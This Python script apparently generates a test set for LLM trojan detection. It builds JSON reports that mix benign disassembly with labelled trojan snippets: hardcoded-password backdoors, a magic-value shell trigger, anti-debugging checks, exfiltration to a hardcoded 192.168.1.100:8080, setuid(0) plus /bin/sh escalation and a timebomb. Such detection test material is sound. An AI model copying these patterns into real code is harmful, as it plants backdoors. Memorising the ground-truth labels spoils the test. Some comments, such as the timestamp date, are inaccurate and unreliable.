#!/usr/bin/env python3
"""Generate synthetic challenging binary disassembly for LLM analysis.

Creates realistic-looking disassembly with various trojan patterns:
1. Hardcoded credentials backdoors
2. Magic value activation triggers  
3. Anti-debugging checks
4. Covert channel / C2 communication
5. Environment fingerprinting
6. Time-based activation
7. Privilege escalation patterns
8. Data exfiltration routines
"""

from __future__ import annotations

import json
import os
import random
from pathlib import Path
from typing import Dict, List


# Realistic function disassembly templates with trojan patterns
BENIGN_FUNCTIONS = [
    {
        "name": "init_logging",
        "disassembly": """0x00401000 <init_logging>:
   401000:       55                      push   rbp
   401001:       48 89 e5                mov    rbp,rsp
   401004:       48 83 ec 20             sub    rsp,0x20
   401008:       bf 01 00 00 00          mov    edi,0x1
   40100d:       e8 2e 0f 00 00          call   0x401f40 <malloc>
   401012:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
   401016:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
   40101a:       c6 00 00                mov    BYTE PTR [rax],0x0
   40101d:       c9                      leave
   40101e:       c3                      ret""",
        "is_trojan": False,
        "ground_truth": "Standard logging initialization"
    },
    {
        "name": "calculate_checksum",
        "disassembly": """0x00402100 <calculate_checksum>:
   402100:       55                      push   rbp
   402101:       48 89 e5                mov    rbp,rsp
   402104:       48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi
   402108:       89 75 e4                mov    DWORD PTR [rbp-0x1c],esi
   40210b:       c7 45 fc 00 00 00 00    mov    DWORD PTR [rbp-0x4],0x0
   402112:       c7 45 f8 00 00 00 00    mov    DWORD PTR [rbp-0x8],0x0
   402119:       eb 1e                   jmp    0x402139
   40211b:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
   40211e:       48 63 d0                movsxd rdx,eax
   402121:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
   402125:       48 01 d0                add    rax,rdx
   402128:       0f b6 00                movzx  eax,BYTE PTR [rax]
   40212b:       0f b6 c0                movzx  eax,al
   40212e:       01 45 fc                add    DWORD PTR [rbp-0x4],eax
   402131:       83 45 f8 01             add    DWORD PTR [rbp-0x8],0x1
   402135:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
   402138:       3b 45 e4                cmp    eax,DWORD PTR [rbp-0x1c]
   40213b:       7c de                   jl     0x40211b
   40213d:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
   402140:       c9                      leave
   402141:       c3                      ret""",
        "is_trojan": False,
        "ground_truth": "Standard checksum calculation loop"
    },
]

TROJAN_FUNCTIONS = [
    {
        "name": "verify_auth",
        "disassembly": """0x00403000 <verify_auth>:
   403000:       55                      push   rbp
   403001:       48 89 e5                mov    rbp,rsp
   403004:       48 89 7d f8             mov    QWORD PTR [rbp-0x8],rdi
   403008:       48 8d 35 f1 2f 00 00    lea    rsi,[rip+0x2ff1]  # "admin123"
   40300f:       48 8b 7d f8             mov    rdi,QWORD PTR [rbp-0x8]
   403013:       e8 e8 0c 00 00          call   0x403d00 <strcmp>
   403018:       85 c0                   test   eax,eax
   40301a:       75 07                   jne    0x403023
   40301c:       b8 01 00 00 00          mov    eax,0x1          # Auth bypass!
   403021:       eb 14                   jmp    0x403037
   403023:       48 8d 35 d6 2f 00 00    lea    rsi,[rip+0x2fd6]  # "FW_DEBUG_KEY"
   40302a:       48 8b 7d f8             mov    rdi,QWORD PTR [rbp-0x8]
   40302e:       e8 cd 0c 00 00          call   0x403d00 <strcmp>
   403033:       85 c0                   test   eax,eax
   403035:       0f 94 c0                sete   al                # Second backdoor
   403038:       c9                      leave
   403039:       c3                      ret""",
        "is_trojan": True,
        "ground_truth": "BACKDOOR: Hardcoded credentials 'admin123' and 'FW_DEBUG_KEY'"
    },
    {
        "name": "process_command",
        "disassembly": """0x00404000 <process_command>:
   404000:       55                      push   rbp
   404001:       48 89 e5                mov    rbp,rsp
   404004:       48 83 ec 30             sub    rsp,0x30
   404008:       48 89 7d d8             mov    QWORD PTR [rbp-0x28],rdi
   40400c:       8b 45 d8                mov    eax,DWORD PTR [rbp-0x28]
   40400f:       3d ef be ad de          cmp    eax,0xdeadbeef   # Magic trigger!
   404014:       75 1a                   jne    0x404030
   404016:       bf 00 00 00 00          mov    edi,0x0
   40401b:       be ff 01 00 00          mov    esi,0x1ff        # rwxrwxrwx
   404020:       e8 db 0a 00 00          call   0x404b00 <chmod> # Weaken perms
   404025:       48 89 c7                mov    rdi,rax
   404028:       e8 d3 0f 00 00          call   0x405000 <spawn_shell>
   40402d:       eb 0c                   jmp    0x40403b
   40402f:       90                      nop
   404030:       48 8b 7d d8             mov    rdi,QWORD PTR [rbp-0x28]
   404034:       e8 c7 10 00 00          call   0x405100 <normal_handler>
   404039:       eb 00                   jmp    0x40403b
   40403b:       c9                      leave
   40403c:       c3                      ret""",
        "is_trojan": True,
        "ground_truth": "BACKDOOR: Magic value 0xdeadbeef triggers shell spawn with 777 permissions"
    },
    {
        "name": "check_environment",
        "disassembly": """0x00405000 <check_environment>:
   405000:       55                      push   rbp
   405001:       48 89 e5                mov    rbp,rsp
   405004:       48 83 ec 20             sub    rsp,0x20
   405008:       48 8d 3d f1 1f 00 00    lea    rdi,[rip+0x1ff1]  # "VMWARE"
   40500f:       e8 ec 1a 00 00          call   0x406b00 <getenv>
   405014:       48 85 c0                test   rax,rax
   405017:       75 2e                   jne    0x405047          # Skip if VM detected
   405019:       48 8d 3d e0 1f 00 00    lea    rdi,[rip+0x1fe0]  # "VBOX"
   405020:       e8 db 1a 00 00          call   0x406b00 <getenv>
   405025:       48 85 c0                test   rax,rax
   405028:       75 1d                   jne    0x405047
   40502a:       0f 31                   rdtsc                    # Timing check
   40502c:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
   405030:       e8 cb 00 00 00          call   0x405100 <activate_payload>
   405035:       0f 31                   rdtsc
   405037:       48 2b 45 f8             sub    rax,QWORD PTR [rbp-0x8]
   40503b:       48 3d 00 10 00 00       cmp    rax,0x1000       # Debugger check
   405041:       77 04                   ja     0x405047
   405043:       31 c0                   xor    eax,eax
   405045:       eb 05                   jmp    0x40504c
   405047:       b8 01 00 00 00          mov    eax,0x1
   40504c:       c9                      leave
   40504d:       c3                      ret""",
        "is_trojan": True,
        "ground_truth": "ANTI-ANALYSIS: VM detection (VMWARE/VBOX) + RDTSC timing anti-debug"
    },
    {
        "name": "send_data",
        "disassembly": """0x00406000 <send_data>:
   406000:       55                      push   rbp
   406001:       48 89 e5                mov    rbp,rsp
   406004:       48 83 ec 40             sub    rsp,0x40
   406008:       48 89 7d d8             mov    QWORD PTR [rbp-0x28],rdi
   40600c:       bf 02 00 00 00          mov    edi,0x2          # AF_INET
   406011:       be 01 00 00 00          mov    esi,0x1          # SOCK_STREAM
   406016:       31 d2                   xor    edx,edx
   406018:       e8 e3 1a 00 00          call   0x407b00 <socket>
   40601d:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
   406020:       c7 45 e0 02 00 00 00    mov    DWORD PTR [rbp-0x20],0x2
   406027:       66 c7 45 e2 1f 90       mov    WORD PTR [rbp-0x1e],0x901f  # Port 8080
   40602d:       c7 45 e4 c0 a8 01 64    mov    DWORD PTR [rbp-0x1c],0x6401a8c0  # 192.168.1.100
   406034:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]
   406037:       48 8d 75 e0             lea    rsi,[rbp-0x20]
   40603b:       ba 10 00 00 00          mov    edx,0x10
   406040:       e8 bb 1b 00 00          call   0x407c00 <connect>
   406045:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]
   406048:       48 8b 75 d8             mov    rsi,QWORD PTR [rbp-0x28]
   40604c:       ba 00 04 00 00          mov    edx,0x400
   406051:       31 c9                   xor    ecx,ecx
   406053:       e8 a8 1c 00 00          call   0x407d00 <send>
   406058:       c9                      leave
   406059:       c3                      ret""",
        "is_trojan": True,
        "ground_truth": "C2-EXFIL: Hardcoded C2 at 192.168.1.100:8080, exfiltrates 1KB data"
    },
    {
        "name": "elevate_privileges",
        "disassembly": """0x00407000 <elevate_privileges>:
   407000:       55                      push   rbp
   407001:       48 89 e5                mov    rbp,rsp
   407004:       31 ff                   xor    edi,edi          # uid=0 (root)
   407006:       b8 69 00 00 00          mov    eax,0x69         # sys_setuid
   40700b:       0f 05                   syscall
   40700d:       85 c0                   test   eax,eax
   40700f:       75 12                   jne    0x407023
   407011:       31 ff                   xor    edi,edi
   407013:       b8 6a 00 00 00          mov    eax,0x6a         # sys_setgid
   407018:       0f 05                   syscall
   40701a:       48 8d 3d df 0f 00 00    lea    rdi,[rip+0xfdf]  # "/bin/sh"
   407021:       eb 05                   jmp    0x407028
   407023:       31 c0                   xor    eax,eax
   407025:       c9                      leave
   407026:       c3                      ret
   407027:       90                      nop
   407028:       31 f6                   xor    esi,esi
   40702a:       31 d2                   xor    edx,edx
   40702c:       b8 3b 00 00 00          mov    eax,0x3b         # sys_execve
   407031:       0f 05                   syscall
   407033:       c9                      leave
   407034:       c3                      ret""",
        "is_trojan": True,
        "ground_truth": "PRIVESC: Direct syscalls setuid(0)/setgid(0) + execve(/bin/sh)"
    },
    {
        "name": "time_triggered_payload",
        "disassembly": """0x00408000 <time_triggered_payload>:
   408000:       55                      push   rbp
   408001:       48 89 e5                mov    rbp,rsp
   408004:       48 83 ec 10             sub    rsp,0x10
   408008:       31 ff                   xor    edi,edi
   40800a:       e8 f1 0b 00 00          call   0x408c00 <time>
   40800f:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
   408013:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
   408017:       48 b9 00 00 87 65 00 00 movabs rcx,0x65870000   # Unix timestamp
   40801f:       00 00
   408021:       48 39 c8                cmp    rax,rcx          # After Jan 1 2024?
   408024:       72 0e                   jb     0x408034
   408026:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
   40802a:       83 e0 01                and    eax,0x1          # Only odd seconds
   40802d:       74 05                   je     0x408034
   40802f:       e8 cc ff ff ff          call   0x408000 <hidden_init>
   408034:       c9                      leave
   408035:       c3                      ret""",
        "is_trojan": True,
        "ground_truth": "TIMEBOMB: Activates after specific date + only on odd seconds"
    },
]


def generate_binary_report(binary_id: str, functions: List[Dict], output_dir: Path) -> Dict:
    """Generate a binary report in the phase2 format."""
    output_dir.mkdir(parents=True, exist_ok=True)
    
    report = {
        "binary_id": binary_id,
        "binary_path": f"/synthetic/{binary_id}",
        "n_functions": len(functions),
        "functions": functions,
        "ground_truth_trojan_functions": [
            f["name"] for f in functions if f["is_trojan"]
        ],
    }
    
    report_path = output_dir / f"{binary_id}.json"
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)
    
    return report


def create_test_binaries(output_dir: Path, n_binaries: int = 10) -> List[Dict]:
    """Create N test binaries with varying trojan complexity."""
    random.seed(42)
    binaries = []
    
    for i in range(n_binaries):
        binary_id = f"test_binary_{i+1:03d}"
        
        # Mix of benign and trojan functions
        n_benign = random.randint(15, 30)
        n_trojan = random.randint(1, 3)
        
        # Select functions
        functions = []
        for j in range(n_benign):
            fn = random.choice(BENIGN_FUNCTIONS).copy()
            fn["name"] = f"{fn['name']}_{j}"
            functions.append(fn)
        
        for j in range(n_trojan):
            fn = TROJAN_FUNCTIONS[j % len(TROJAN_FUNCTIONS)].copy()
            fn["name"] = f"{fn['name']}_{j}"
            functions.append(fn)
        
        # Shuffle to make trojans not always at end
        random.shuffle(functions)
        
        report = generate_binary_report(binary_id, functions, output_dir)
        binaries.append(report)
        
        print(f"Created {binary_id}: {n_benign} benign + {n_trojan} trojan functions")
    
    return binaries


def main():
    output_dir = Path("data/synthetic_binaries")
    print("="*60)
    print("GENERATING SYNTHETIC TEST BINARIES")
    print("="*60)
    
    binaries = create_test_binaries(output_dir, n_binaries=10)
    
    print(f"\nCreated {len(binaries)} test binaries in {output_dir}")
    print("\nGround truth trojans:")
    for b in binaries:
        trojans = b["ground_truth_trojan_functions"]
        print(f"  {b['binary_id']}: {trojans}")


if __name__ == "__main__":
    main()
